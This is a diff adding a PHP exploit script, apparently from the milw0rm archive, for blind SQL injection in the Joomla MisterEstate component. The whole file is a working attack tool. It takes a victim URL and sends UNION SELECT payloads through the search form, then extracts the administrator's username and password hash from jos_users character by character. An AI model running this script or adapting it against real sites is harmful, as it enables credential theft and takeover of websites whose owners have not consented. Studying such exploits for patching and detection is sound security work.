@@ -1,0 +1,135 @@
+<?php
+
+  echo '<h2>Joomla Component MisterEstate Blind SQL Injection Exploit</h2>';
+
+  // http://www.misterestate.com/
+
+  ini_set( "memory_limit", "512M" );
+
+                ini_set( "max_execution_time", 0 );
+
+                set_time_limit( 0 );
+
+                if( !isset( $_GET['url'] ) ) die( 'Usage: '.$_SERVER['SCRIPT_NAME'].'?url=www.victim.com' );
+
+  $url = "http://".$_GET['url']."/index.php?option=com_misterestate&act=mesearch&task=showMESR&tmpl=component";
+
+  $data = array();
+
+  $data['src_cat'] = 0;
+
+  $data['country'] = 'no';
+
+  $data['state'] = 'no';
+
+  $data['town'] = 'no';
+
+  $data['district'] = 'no';
+
+  $data['mesearch'] = 'Start Search';
+
+  $admin = '';
+
+  $output = getData( "1%') AND 1=2 UNION SELECT id FROM jos_users WHERE gid=25 ORDER BY id ASC LIMIT 1 -- '" );
+
+  if( !testData( $output ) ) die('failed');
+
+  echo '<br />Check passed... trying exploit...<br /><br />';
+
+ 
+
+  for( $i=0;$i<250;$i++ )
+
+  {
+
+    for( $j=48; $j<126; $j++ )
+
+    {
+
+      $output = getData( "1%') AND 1=2 UNION SELECT id FROM jos_users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(username,0x3a,password),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- '" );
+
+      if( testData( $output ) )
+
+      {
+
+        ob_end_clean();
+
+        $admin .= chr( $j );
+
+        echo "Found character $i : buffer is now $admin<br />";
+
+      }
+
+      ob_end_clean();
+
+    }
+
+  }
+
+  echo "<h3>All done!</h3>";
+
+  echo "<h4>$admin</h4>";
+
+  function shutUp( $buffer ) { return false; }
+
+  function testData( $output )
+
+  {
+
+    /* feel free to add other translations as needed */
+
+    $reg = array( '/Your\ search\ produced\ 1\ hits/', '/Su\ busqueda\ ha\ encontrado\ 1\ aciertos/' );
+
+    foreach( $reg as $r )
+
+      if( preg_match( $r, $output ) )
+
+        return TRUE;
+
+    return FALSE;
+
+  }
+
+  function getData( $string )
+
+  {
+
+    global $data, $url;
+
+    $data['searchstring'] = $string;
+
+    ob_start( "shutUp" );
+
+    $ch = curl_init();
+
+    curl_setopt( $ch, CURL_TIMEOUT, 120 );
+
+    curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );
+
+    curl_setopt( $ch, CURLOPT_URL, $url );
+
+    if( count( $data ) > 0 )
+
+    {
+
+      curl_setopt( $ch, CURLOPT_POST, count( $data ) );
+
+      curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );
+
+    }
+
+    curl_setopt( $ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)" );
+
+    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
+
+    $result = curl_exec( $ch );
+
+    curl_close( $ch );
+
+    return ob_get_contents();
+
+  }
+
+  /* jdc 2009 */
+
+# milw0rm.com [2009-08-18]
